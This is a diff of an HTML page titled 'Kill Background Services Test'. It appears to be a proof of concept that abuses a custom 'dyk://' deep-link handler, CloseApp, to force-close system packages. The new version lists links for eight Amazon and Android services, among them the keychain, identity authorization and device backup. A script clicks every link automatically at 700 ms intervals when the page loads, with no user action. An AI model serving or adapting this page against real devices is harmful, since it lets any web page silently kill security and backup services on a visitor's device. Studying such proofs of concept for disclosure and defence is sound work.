@@ -1,13 +1,70 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate, max-age=0">
-  <meta http-equiv="Pragma" content="no-cache">
-  <meta http-equiv="Expires" content="0">
-  <meta http-equiv="refresh" content="0; url=dyk://somehost/path/CloseApp?targetPkg=com.amazon.device.messaging">
-  <title>Redirecting...</title>
-</head>
-<body>
-  If you are not redirected, <a href="dyk://somehost/path/CloseApp?targetPkg=com.amazon.device.messaging">click here</a>.
-</body>
+	<head>
+    <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate, max-age=0">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<title>Kill Background Services Test</title>
+	</head>
+	<body>
+		<center>
+			<h2>Kill Background Services Test</h2>
+			<br>
+			<br>
+			<br>
+			<h3>
+				<br>
+				<br>
+<a href="dyk://somehost/path/CloseApp?targetPkg=com.amazon.sync.service">com.amazon.sync.service</a>
+				<br>
+				<br>
+				<br>
+<a href="dyk://somehost/path/CloseApp?targetPkg=com.android.keychain">com.android.keychain</a>
+				<br>
+				<br>
+				<br>
+<a href="dyk://somehost/path/CloseApp?targetPkg=com.amazon.identity.auth.device.authorization">com.amazon.identity.auth.device.authorization</a>
+				<br>
+				<br>
+				<br>
+<a href="dyk://somehost/path/CloseApp?targetPkg=com.amazon.diode">com.amazon.diode</a>
+				<br>
+				<br>
+				<br>
+<a href="dyk://somehost/path/CloseApp?targetPkg=com.amazon.adep">com.amazon.adep</a>
+				<br>
+				<br>
+				<br>
+<a href="dyk://somehost/path/CloseApp?targetPkg=com.amazon.alta.h2clientservice">com.amazon.alta.h2clientservice</a>
+				<br>
+				<br>
+				<br>
+<a href="dyk://somehost/path/CloseApp?targetPkg=com.amazon.avod">com.amazon.avod</a>
+				<br>
+				<br>
+				<br>
+<a href="dyk://somehost/path/CloseApp?targetPkg=com.amazon.device.backup">com.amazon.device.backup</a>
+				<br>
+				<br>
+			</h3>
+		</center>
+
+		<script>
+			const anchors = Array.from(document.querySelectorAll('a'));
+			let index = 0;
+
+			const interval = setInterval(() => {
+				if (index >= anchors.length) {
+					clearInterval(interval);
+					return;
+				}
+
+				anchors[index].click();
+				index++;
+			}, 700);
+		</script>
+	</body>
 </html>
